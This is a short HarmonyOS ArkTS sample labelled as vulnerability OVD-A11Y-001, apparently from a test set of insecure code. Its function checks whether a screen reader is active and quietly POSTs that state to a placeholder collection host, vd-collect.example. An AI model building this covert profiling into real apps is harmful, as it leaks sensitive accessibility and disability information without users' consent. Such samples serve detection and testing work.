// VULN: OVD-A11Y-001 无障碍/读屏状态侦察并上报收集端点（设备环境画像，CWE-200/359）
import { accessibility } from '@kit.AccessibilityKit';
import { http } from '@kit.NetworkKit';

export async function ovdA11y001(): Promise<string> {
  const reader = accessibility.isScreenReaderOpenSync();
  const req: http.HttpRequest = http.createHttp();
  await req.request('https://vd-collect.example/a11y', {
    method: http.RequestMethod.POST,
    extraData: JSON.stringify({ screenReader: reader })
  });
  req.destroy();
  return `a11y state posted to vd-collect.example`;
}
